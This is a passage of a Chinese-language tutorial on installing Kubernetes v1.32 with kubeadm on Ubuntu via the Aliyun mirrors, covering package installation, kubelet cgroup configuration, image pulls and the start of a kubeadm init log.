/var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n\n1.32.1-1.1 (/var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages)\n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n\n1.32.0-1.1 (/var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages)\n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n Description Language: \n                 File: /var/lib/apt/lists/mirrors.aliyun.com_kubernetes-new_core_stable_v1.32_deb_Packages\n                  MD5: \n\n\nReverse Depends: \n  kubeadm:ppc64el,kubeadm\n  kubeadm:s390x,kubeadm\n  kubeadm:arm64,kubeadm\n  kubeadm:ppc64el,kubeadm\n  kubeadm:s390x,kubeadm\n  kubeadm:arm64,kubeadm\n  kubeadm:ppc64el,kubeadm\n  kubeadm:s390x,kubeadm\n  kubeadm:arm64,kubeadm\n  kubeadm:ppc64el,kubeadm\n  kubeadm:s390x,kubeadm\n  kubeadm:arm64,kubeadm\nDependencies: \n1.32.3-1.1 - cri-tools (2 1.30.0) kubeadm:ppc64el (32 (null)) kubeadm:arm64 (32 (null)) kubeadm:s390x (32 (null)) \n1.32.2-1.1 - cri-tools (2 1.30.0) kubeadm:ppc64el (32 (null)) kubeadm:arm64 (32 (null)) kubeadm:s390x (32 (null)) \n1.32.1-1.1 - cri-tools (2 1.30.0) kubeadm:ppc64el (32 (null)) kubeadm:arm64 (32 (null)) kubeadm:s390x (32 (null)) \n1.32.0-1.1 - cri-tools (2 1.30.0) kubeadm:ppc64el (32 (null)) kubeadm:arm64 (32 (null)) kubeadm:s390x (32 (null)) \nProvides: \n1.32.3-1.1 - \n1.32.2-1.1 - \n1.32.1-1.1 - \n1.32.0-1.1 - \nReverse Provides: \n</code></pre> <p>\u200b\u67e5\u770b\u200b\u53ef\u7528\u200b\u8f6f\u4ef6\u200b\u5217\u8868\u200b</p> Bash<pre><code>root@k8s-master01:~# apt-cache madison kubeadm\n\n   kubeadm | 1.32.3-1.1 | https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n   kubeadm | 1.32.2-1.1 | https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n   kubeadm | 1.32.1-1.1 | https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n   kubeadm | 1.32.0-1.1 | https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.32/deb  Packages\n</code></pre> <p>Way1\uff1a\u200b\u91c7\u7528\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b</p> Bash<pre><code>~# sudo apt-get install kubelet kubeadm kubectl -y\n</code></pre> <p>Way2\uff1a\u200b\u5b89\u88c5\u200b\u6307\u5b9a\u200b\u7248\u672c\u200b(v1.32.3-1.1)</p> Bash<pre><code>~# sudo apt-get install -y kubelet=1.32.3-1.1 kubeadm=1.32.3-1.1 kubectl=1.32.3-1.1\n</code></pre> <ul> <li>\u200b\u5982\u200b\u6709\u200b\u62a5\u9519\u200b\uff1a</li> </ul> <p>Bash<pre><code>E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 5005 \n(unattended-upgr)\n N: Be aware that removing the lock file is not a solution and may break your \nsystem.\n E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is \nanother process using it?\n</code></pre> \u200b\u53ef\u200b\u7a0d\u200b\u7b49\u7b49\u200b</p> <p>\u200b\u9501\u5b9a\u200b\u7248\u672c\u200b\uff0c\u200b\u9632\u6b62\u200b\u540e\u671f\u200b\u81ea\u52a8\u66f4\u65b0\u200b</p> Bash<pre><code>~# sudo apt-mark hold kubelet kubeadm kubectl\n</code></pre> <p>\u200b\u89e3\u9501\u200b\u7248\u672c\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u66f4\u65b0\u200b</p> Bash<pre><code>~# sudo apt-mark unhold kubelet kubeadm kubectl\n</code></pre>"},{"location":"3/2/#322-kubelet","title":"3.2.2 \u200b\u914d\u7f6e\u200bkubelet","text":"<p>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u5bb9\u5668\u200b\u8fd0\u884c\u200b\u65f6\u200b\u4f7f\u7528\u200b\u7684\u200bcgroupdriver\u200b\u4e0e\u200bkubelet\u200b\u4f7f\u7528\u200b\u7684\u200bcgroup\u200b\u7684\u200b\u4e00\u81f4\u6027\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4fee\u6539\u200b\u5982\u4e0b\u200b\u6587\u4ef6\u200b\u5185\u5bb9\u200b\u3002</p> Bash<pre><code>~# nano /etc/default/kubelet\n KUBELET_EXTRA_ARGS=\"--cgroup-driver=systemd\"\n</code></pre> <ul> <li>\u200b\u8bbe\u7f6e\u200bkubelet\u200b\u4e3a\u200b\u5f00\u673a\u200b\u81ea\u542f\u52a8\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6ca1\u6709\u200b\u751f\u6210\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u96c6\u7fa4\u200b\u521d\u59cb\u5316\u200b\u540e\u200b\u81ea\u52a8\u200b\u542f\u52a8\u200b</li> </ul> Bash<pre><code>~# systemctl enable kubelet\n</code></pre>"},{"location":"3/2/#33-k8s","title":"3.3 K8S\u200b\u96c6\u7fa4\u200b\u521d\u59cb\u5316","text":""},{"location":"3/2/#331","title":"3.3.1 \u200b\u67e5\u770b\u200b\u7248\u672c","text":"Bash<pre><code>root@k8s-master01:~# kubeadm version\n\nkubeadm version: &amp;version.Info{Major:\"1\", Minor:\"32\", GitVersion:\"v1.32.3\", GitCommit:\"32cc146f75aad04beaaa245a7157eb35063a9f99\", GitTreeState:\"clean\", BuildDate:\"2025-03-11T19:57:38Z\", GoVersion:\"go1.23.6\", Compiler:\"gc\", Platform:\"linux/amd64\"}\n</code></pre>"},{"location":"3/2/#332","title":"3.3.2 \u200b\u751f\u6210\u200b\u90e8\u7f72\u200b\u914d\u7f6e\u6587\u4ef6","text":"<p>\u200b\u751f\u6210\u200bkubeadm\u200b\u90e8\u7f72\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u6587\u4ef6\u200b</p> Bash<pre><code>root@k8s-master01:~# kubeadm config print init-defaults &gt; /home/acanx/kubeadm-config.yaml\n</code></pre>"},{"location":"3/2/#kubernetes","title":"\u4f7f\u7528\u200bkubernetes\u200b\u793e\u533a\u200b\u7248\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93","text":"Bash<pre><code>root@k8s-master01:~# nano /home/acanx/kubeadm-config.yaml\nroot@k8s-master01:~# cat kubeadm-config.yaml\n</code></pre> <p>kubeadm-config.yaml\u200b\u6587\u4ef6\u200b\u4e2d\u200b \u200b\u7684\u200b\u914d\u7f6e\u200b</p> YAML<pre><code> apiVersion: kubeadm.k8s.io/v1beta3\n bootstrapTokens:- groups:- system:bootstrappers:kubeadm:default-node-token\n token: abcdef.0123456789abcdef\n ttl: 24h0m0s\n usages:- signing- authentication\n kind: InitConfiguration\n localAPIEndpoint:\n advertiseAddress: 192.168.10.140\n bindPort: 6443\n nodeRegistration:\n criSocket: unix:///var/run/containerd/containerd.sock\n imagePullPolicy: IfNotPresent\n name: k8s-master01\n taints: null--\napiServer:\n timeoutForControlPlane: 4m0s\n apiVersion: kubeadm.k8s.io/v1beta3\n certificatesDir: /etc/kubernetes/pki\n clusterName: kubernetes\n controllerManager: {}\n dns: {}\n etcd:\n local:\n dataDir: /var/lib/etcd\n imageRepository: registry.k8s.io\n kind: ClusterConfiguration\n kubernetesVersion: 1.30.0\n networking:\n dnsDomain: cluster.local\n serviceSubnet: 10.96.0.0/12\n podSubnet: 10.244.0.0/16\nscheduler: {}\n--\nkind: KubeletConfiguration\napiVersion: kubelet.config.k8s.io/v1beta1\ncgroupDriver: systemd\n</code></pre>"},{"location":"3/2/#_3","title":"\u4f7f\u7528\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93","text":"<p>\u200b\u7f16\u8f91\u200bkubeadm\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08\u200b\u4f7f\u7528\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\uff09</p> Bash<pre><code>root@k8s-master01:~# nano kubeadm-config.yaml\n</code></pre> YAML<pre><code>apiVersion: kubeadm.k8s.io/v1beta4\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  token: abcdef.0123456789abcdef\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 192.168.11.161   # \u200b\u8bbe\u7f6e\u200b\u8282\u70b9\u200bIP\u200b\u5730\u5740\u200b\n  bindPort: 6443\nnodeRegistration:\n  criSocket: unix:///var/run/containerd/containerd.sock\n  imagePullPolicy: IfNotPresent\n  imagePullSerial: true\n  name: k8s-master01      # \u200b\u4fee\u6539\u200b\u8282\u70b9\u200b\u540d\u79f0\u200b\n  taints: null\ntimeouts:\n  controlPlaneComponentHealthCheck: 4m0s\n  discovery: 5m0s\n  etcdAPICall: 2m0s\n  kubeletHealthCheck: 4m0s\n  kubernetesAPICall: 1m0s\n  tlsBootstrap: 5m0s\n  upgradeManifests: 5m0s\n---\napiServer: {}\napiVersion: kubeadm.k8s.io/v1beta4\ncaCertificateValidityPeriod: 87600h0m0s\ncertificateValidityPeriod: 8760h0m0s\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns: {}\nencryptionAlgorithm: RSA-2048\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: registry.aliyuncs.com/google_containers   # \u200b\u4fee\u6539\u200b\u955c\u50cf\u200b\u5730\u5740\u200b\nkind: ClusterConfiguration\nkubernetesVersion: 1.32.0\nnetworking:\n  dnsDomain: cluster.local\n  serviceSubnet: 10.96.0.0/12\n  podSubnet: 10.244.0.0/16    # \u200b\u53ef\u200b\u6309\u200b\u9700\u200b\u4fee\u6539\u200b\uff0c\u200b\u539f\u5219\u200b\uff1a\u200b\u4e0d\u200b\u4e0e\u200b\u5df2\u6709\u200b\u7684\u200b\u8282\u70b9\u200b\u7f51\u6bb5\u200b\u91cd\u5408\u200b\nproxy: {}\nscheduler: {}\n---\nkind: KubeletConfiguration                   # \u200b\u6700\u540e\u200b\u56db\u884c\u200b\u662f\u200b\u8865\u52a0\u200b\u7684\u200b\napiVersion: kubelet.config.k8s.io/v1beta1\ncgroupDriver: systemd\n</code></pre>"},{"location":"3/2/#333","title":"3.3.3 \u200b\u67e5\u770b\u200b\u5e76\u200b\u4e0b\u8f7d\u200b\u955c\u50cf","text":""},{"location":"3/2/#kubernetes_1","title":"\u67e5\u770b\u200b\u53ca\u200b\u4f7f\u7528\u200bKubernetes\u200b\u793e\u533a\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0b\u8f7d\u200b\u955c\u50cf","text":"<p>\u200b\u67e5\u770b\u200b\u955c\u50cf\u200b\u5217\u8868\u200b\uff08K8S\u200b\u793e\u533a\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\uff09</p> Bash<pre><code>root@k8s-master01:~# kubeadm config images list   # \u200b\u67e5\u770b\u200bkubernetes\u200b\u955c\u50cf\u200b\u9ed8\u8ba4\u200b\u7248\u672c\u200b\n\nroot@k8s-master01:~# kubeadm config images list --kubernetes-version=v1.32.3    # \u200b\u6307\u5b9a\u200bkubernetes\u200b\u955c\u50cf\u200b\u7248\u672c\u200b\n\nregistry.k8s.io/kube-apiserver:v1.32.3\nregistry.k8s.io/kube-controller-manager:v1.32.3\nregistry.k8s.io/kube-scheduler:v1.32.3\nregistry.k8s.io/kube-proxy:v1.32.3\nregistry.k8s.io/coredns/coredns:v1.11.3\nregistry.k8s.io/pause:3.10\nregistry.k8s.io/etcd:3.5.16-0\n</code></pre> Bash<pre><code> root@k8s-master01:~# kubeadm config images pull           # \u200b\u9ed8\u8ba4\u200b\u4ece\u200bK8S\u200b\u793e\u533a\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0b\u8f7d\u200b\u955c\u50cf\u200b\n\n [config/images] Pulled registry.k8s.io/kube-apiserver:v1.32.3\n [config/images] Pulled registry.k8s.io/kube-controller-manager:v1.32.3\n [config/images] Pulled registry.k8s.io/kube-scheduler:v1.32.3\n [config/images] Pulled registry.k8s.io/kube-proxy:v1.32.3\n [config/images] Pulled registry.k8s.io/coredns/coredns:v1.11.3\n [config/images] Pulled registry.k8s.io/pause:3.10\n [config/images] Pulled registry.k8s.io/etcd:3.5.16-0\n</code></pre>"},{"location":"3/2/#_4","title":"\u67e5\u770b\u200b\u53ca\u200b\u4f7f\u7528\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0b\u8f7d\u200b\u955c\u50cf","text":"<p>\u200b\u67e5\u770b\u200b\u955c\u50cf\u200b\u5217\u8868\u200b\uff08\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\uff09</p> Bash<pre><code>root@k8s-master01:~# kubeadm config images list --image-repository registry.aliyuncs.com/google_containers\n\nregistry.aliyuncs.com/google_containers/kube-apiserver:v1.32.3\nregistry.aliyuncs.com/google_containers/kube-controller-manager:v1.32.3\nregistry.aliyuncs.com/google_containers/kube-scheduler:v1.32.3\nregistry.aliyuncs.com/google_containers/kube-proxy:v1.32.3\nregistry.aliyuncs.com/google_containers/coredns:v1.11.3\nregistry.aliyuncs.com/google_containers/pause:3.10\nregistry.aliyuncs.com/google_containers/etcd:3.5.16-0\n</code></pre> <p>\u200b\u4f7f\u7528\u200b\u963f\u91cc\u200b\u4e91\u200b\u5bb9\u5668\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0b\u8f7d\u200b</p> Bash<pre><code>root@k8s-master01:~# kubeadm config images pull --image-repository registry.aliyuncs.com/google_containers --cri-socket=unix:///run/containerd/containerd.sock\n\n[config/images] Pulled registry.aliyuncs.com/google_containers/kube-apiserver:v1.32.3\n[config/images] Pulled registry.aliyuncs.com/google_containers/kube-controller-manager:v1.32.3\n[config/images] Pulled registry.aliyuncs.com/google_containers/kube-scheduler:v1.32.3\n[config/images] Pulled registry.aliyuncs.com/google_containers/kube-proxy:v1.32.3\n[config/images] Pulled registry.aliyuncs.com/google_containers/coredns:v1.11.3\n[config/images] Pulled registry.aliyuncs.com/google_containers/pause:3.10\n[config/images] Pulled registry.aliyuncs.com/google_containers/etcd:3.5.16-0\n</code></pre>"},{"location":"3/2/#_5","title":"\u67e5\u770b\u200b\u4e0b\u8f7d\u200b\u7684\u200b\u955c\u50cf","text":"<p>\u200b\u67e5\u770b\u200b\u672c\u5730\u4e0b\u8f7d\u200b\u7684\u200bcontainerd\u200b\u955c\u50cf\u200b</p> Bash<pre><code>root@k8s-master01:~# crictl images\n\nWARN[0000] Config \"/etc/crictl.yaml\" does not exist, trying next: \"/usr/bin/crictl.yaml\" \nWARN[0000] Image connect using default endpoints: [unix:///run/containerd/containerd.sock unix:///run/crio/crio.sock unix:///var/run/cri-dockerd.sock]. As the default settings are now deprecated, you should set the endpoint instead. \nIMAGE                                                             TAG                 IMAGE ID            SIZE\nregistry.aliyuncs.com/google_containers/coredns                   v1.11.3             c69fa2e9cbf5f       18.6MB\nregistry.aliyuncs.com/google_containers/etcd                      3.5.16-0            a9e7e6b294baf       57.7MB\nregistry.aliyuncs.com/google_containers/kube-apiserver            v1.32.0             c2e17b8d0f4a3       28.7MB\nregistry.aliyuncs.com/google_containers/kube-apiserver            v1.32.3             f8bdc4cfa0651       28.7MB\nregistry.aliyuncs.com/google_containers/kube-controller-manager   v1.32.0             8cab3d2a8bd0f       26.3MB\nregistry.aliyuncs.com/google_containers/kube-controller-manager   v1.32.3             085818208a521       26.3MB\nregistry.aliyuncs.com/google_containers/kube-proxy                v1.32.0             040f9f8aac8cd       30.9MB\nregistry.aliyuncs.com/google_containers/kube-proxy                v1.32.3             a1ae78fd2f9d8       30.9MB\nregistry.aliyuncs.com/google_containers/kube-scheduler            v1.32.0             a389e107f4ff1       20.7MB\nregistry.aliyuncs.com/google_containers/kube-scheduler            v1.32.3             b4260bf5078ab       20.7MB\nregistry.aliyuncs.com/google_containers/pause                     3.10                873ed75102791       320kB\n</code></pre>"},{"location":"3/2/#334-k8s","title":"3.3.4 \u200b\u4f7f\u7528\u200b\u90e8\u7f72\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u521d\u59cb\u5316\u200bK8S\u200b\u96c6\u7fa4","text":"<p>\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b\u521d\u59cb\u5316\u200bKubeadm\uff08\u200b\u53ea\u200b\u5728\u200bMaster\u200b\u8282\u70b9\u200b\u64cd\u4f5c\u200b\uff09</p> <p>Bash<pre><code>root@k8s-master01:~# kubeadm init --config /home/acanx/kubeadm-config.yaml  --upload-certs --v=9  --cri-socket=unix:///run/containerd/containerd.sock\n</code></pre> \u200b\u8f93\u51fa\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> Bash<pre><code>I0322 20:07:35.623621    4886 initconfiguration.go:261] loading configuration from \"/home/acanx/kubeadm-config.yaml\"\n[init] Using Kubernetes version: v1.32.0\n[preflight] Running pre-flight checks\nI0322 20:07:35.633576    4886 checks.go:561] validating Kubernetes and kubeadm version\nI0322 20:07:35.633610    4886 checks.go:166] validating if the firewall is enabled and active\nI0322 20:07:35.651826    4886 checks.go:201] validating availability of port 6443\nI0322 20:07:35.652309    4886 checks.go:201] validating availability of port 10259\nI0322 20:07:35.652373    4886 checks.go:201] validating availability of port 10257\nI0322 20:07:35.652434    4886 checks.go:278] validating the existence of file /etc/kubernetes/manifests/kube-apiserver.yaml\nI0322 20:07:35.652491    4886 checks.go:278] validating the existence of file /etc/kubernetes/manifests/kube-controller-manager.yaml\nI0322 20:07:35.652520    4886 checks.go:278] validating the existence of file /etc/kubernetes/manifests/kube-scheduler.yaml\nI0322 20:07:35.652560    4886 checks.go:278] validating the existence of file /etc/kubernetes/manifests/etcd.yaml\nI0322 20:07:35.652582    4886 checks.go:428] validating if the connectivity type is via proxy or direct\nI0322 20:07:35.652631    4886 checks.go:467] validating http connectivity to first IP address in the CIDR\nI0322 20:07:35.652672    4886 checks.go:467] validating http connectivity to first IP address in the CIDR\nI0322 20:07:35.652699    4886 checks.go:102] validating the container runtime\nI0322 20:07:35.653795    4886 checks.go:637] validating whether swap is enabled or not\nI0322 20:07:35.653855    4886 checks.go:368] validating the presence of executable ip\nI0322 20:07:35.653947    4886 checks.go:368] validating the presence of executable iptables\nI0322 20:07:35.654055    4886 checks.go:368] validating the presence of executable mount\nI0322 20:07:35.654080    4886 checks.go:368] validating the presence of executable nsenter\nI0322 20:07:35.654117    4886 checks.go:368] validating the presence of executable ethtool\nI0322 20:07:35.654145    4886 checks.go:368] validating the presence of executable tc\nI0322 20:07:35.654182    4886 checks.go:368] validating the presence of executable touch\nI0322 20:07:35.654210    4886 checks.go:514] running all checks\nI0322 20:07:35.680418    4886 checks.go:399] checking whether the given node name is valid and reachable using net.LookupHost\nI0322 20:07:35.680635    4886 checks.go:603] validating kubelet version\nI0322 20:07:35.753081    4886 checks.go:128] validating if the \"kubelet\" service is enabled and active\nI0322 20:07:35.774195    4886 checks.go:201] validating availability of port 10250\nI0322 20:07:35.774355    4886 checks.go:327] validating the contents of file /proc/sys/net/ipv4/ip_forward\nI0322 20:07:35.774477    4886 checks.go:201] validating availability of port 2379\nI0322 20:07:35.774568    4886 checks.go:201] validating availability of port 2380\nI0322 20:07:35.774631    4886 checks.go:241] validating the existence and emptiness of directory /var/lib/etcd\n[preflight] Pulling images required for setting up a Kubernetes cluster\n[preflight] This might take a minute or two, depending on the speed of your internet connection\n[preflight] You can also perform this action beforehand using 'kubeadm config images pull'\nI0322 20:07:35.777659    4886 checks.go:832] using image pull policy: IfNotPresent\nI0322 20:07:35.779807    4886 checks.go:868] pulling: registry.aliyuncs.com/google_containers/kube-apiserver:v1.32.0\nI0322 20:08:11.358938    4886 checks.go:868] pulling: registry.aliyuncs.com/google_containers/kube-controller-manager:v1.32.0\nI0322 20:08:38.140994    4886 checks.go:868] pulling: registry.aliyuncs.com/google_containers/kube-scheduler:v1.32.0\nI0322 20:09:00.270475    4886 checks.go:868] pulling: registry.aliyuncs.com/google_containers/kube-proxy:v1.32.0\nI0322 20:09:26.947685    4886 checks.go:863] image exists: registry.aliyuncs.com/google_containers/coredns:v1.11.3\nI0322 20:09:26.948207    4886 checks.go:863] image exists: registry.aliyuncs.com/google_containers/pause:3.10\nI0322 20:09:26.948594    4886 checks.go:863] image exists: registry.aliyuncs.com/google_containers/etcd:3.5.16-0\n[certs] Using certificateDir folder \"/etc/kubernetes/pki\"\nI0322 20:09:26.948692    4886 certs.go:112] creating a new certificate authority for ca\n[certs] Generating \"ca\" certificate and key\nI0322 20:09:27.066597    4886 certs.go:473] validating certificate period for ca certificate\n[certs] Generating \"apiserver\" certificate and key\n[certs] apiserver serving cert is signed for DNS names [k8s-master01 kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.96.0.1 192.168.11.161]\n[certs] Generating \"apiserver-kubelet-client\" certificate and key\nI0322 20:09:27.313725    4886 certs.go:112] creating a new certificate authority for front-proxy-ca\n[certs] Generating \"front-proxy-ca\" certificate and key\nI0322 20:09:27.439421    4886 certs.go:473] validating certificate period for front-proxy-ca certificate\n[certs] Generating \"front-proxy-client\" certificate and key\nI0322 20:09:27.532545    4886 certs.go:112] creating a new certificate authority for etcd-ca\n[certs] Generating \"etcd/ca\" certificate and key\nI0322 20:09:27.631261    4886 certs.go:473] validating certificate period for etcd/ca certificate\n[certs] Generating \"etcd/server\" certificate and key\n[certs] etcd/server serving cert is signed for DNS names [k8s-master01 localhost] and IPs [192.168.11.161 127.0.0.1 ::1]\n[certs] Generating \"etcd/peer\" certificate and key\n[certs] etcd/peer serving cert is signed for DNS names [k8s-master01 localhost] and IPs [192.168.11.161 127.0.0.1 ::1]\n[certs] Generating \"etcd/healthcheck-client\" certificate and key\n[certs] Generating \"apiserver-etcd-client\" certificate and key\nI0322 20:09:28.312889    4886 certs.go:78] creating new public/private key files for signing service account users\n[certs] Generating \"sa\" key and public key\n[kubeconfig] Using kubeconfig folder \"/etc/kubernetes\"\nI0322 20:09:28.495281    4886 kubeconfig.go:111] creating kubeconfig file for admin.conf\n[kubeconfig] Writing \"admin.conf\" kubeconfig file\nI0322 20:09:28.848054    4886 kubeconfig.go:111] creating kubeconfig file for super-admin.conf\n[kubeconfig] Writing \"super-admin.conf\" kubeconfig file\nI0322 20:09:29.129094    4886 kubeconfig.go:111] creating kubeconfig file for kubelet.conf\n[kubeconfig] Writing \"kubelet.conf\" kubeconfig file\nI0322 20:09:29.386206    4886 kubeconfig.go:111] creating kubeconfig file for controller-manager.conf\n[kubeconfig] Writing \"controller-manager.conf\" kubeconfig file\nI0322 20:09:29.483874    4886 kubeconfig.go:111] creating kubeconfig file for scheduler.conf\n[kubeconfig] Writing \"scheduler.conf\" kubeconfig file\n[etcd] Creating static Pod manifest for local etcd in \"/etc/kubernetes/manifests\"\nI0322 20:09:29.607843    4886 local.go:66] [etcd] wrote Static Pod manifest for a local etcd member to \"/etc/kubernetes/manifests/etcd.yaml\"\n[control-plane] Using manifest folder \"/etc/kubernetes/manifests\"\n[control-plane] Creating static Pod manifest for \"kube-apiserver\"\nI0322 